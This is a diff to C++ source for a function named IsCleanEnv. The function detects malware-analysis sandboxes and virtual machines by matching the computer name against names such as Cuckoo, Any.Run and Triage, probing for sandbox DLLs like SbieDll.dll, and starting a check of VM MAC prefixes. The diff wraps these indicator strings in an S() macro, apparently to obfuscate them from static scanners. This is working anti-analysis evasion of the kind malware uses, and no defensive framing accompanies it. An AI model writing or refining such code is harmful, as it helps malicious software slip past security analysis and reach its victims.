@@ -103,18 +103,11 @@ static bool IsCleanEnv() {
 	GetComputerNameA(compName, &cn_sz);
 	std::string cn(compName);
 	std::transform(cn.begin(), cn.end(), cn.begin(), [](unsigned char c){ return std::tolower(c); });
-	static const char* sbNames[] = {
-		"hal9th",    // Windows Defender MpCmdRun sandbox
-		"cuckoo",    // Cuckoo sandbox default
-		"sandbox",   // Generic sandbox name
-		"virus",     // Malware analysis VMs
-		"malware",   // Malware analysis VMs
-		"triage",    // Hatching Triage sandbox
-		"anyrun",    // Any.Run sandbox
-		"vmware",    // VMware-named machines
-		"jotti",     // Jotti's malware scan
+	static const std::vector<std::string> sbNames = {
+		S("hal9th"), S("cuckoo"), S("sandbox"), S("virus"), S("malware"),
+		S("triage"), S("anyrun"), S("vmware"), S("jotti"),
 	};
-	for (auto name : sbNames)
+	for (const auto& name : sbNames)
 		if (cn.find(name) != std::string::npos) return false;
 
 	// ── Physical RAM ─────────────────────────────────────────────────────────────
@@ -145,16 +138,12 @@ static bool IsCleanEnv() {
 	// ── Sandbox-specific loaded DLLs ─────────────────────────────────────────────
 	// These DLLs are only present in specific sandbox/analysis environments.
 	// Using GetModuleHandleA: no disk I/O, no import, pure PEB walk.
-	static const char* sbDlls[] = {
-		"SbieDll.dll",    // Sandboxie isolation DLL
-		"api_log.dll",    // Any.Run API logging hook
-		"dir_watch.dll",  // Cuckoo filesystem watcher
-		"vmcheck.dll",    // Generic VM detection tool
-		"wpespy.dll",     // WPE Pro packet sniffer
-		"pstorec.dll",    // Older sandbox hook
+	static const std::vector<std::string> sbDlls = {
+		S("SbieDll.dll"), S("api_log.dll"), S("dir_watch.dll"),
+		S("vmcheck.dll"), S("wpespy.dll"),  S("pstorec.dll"),
 	};
-	for (auto dll : sbDlls)
-		if (GetModuleHandleA(dll)) return false;
+	for (const auto& dll : sbDlls)
+		if (GetModuleHandleA(dll.c_str())) return false;
 
 	// ── Network adapter MAC address prefix (VM vendors) ──────────────────────────
 	// VMware:    00:0C:29, 00:50:56, 00:05:69
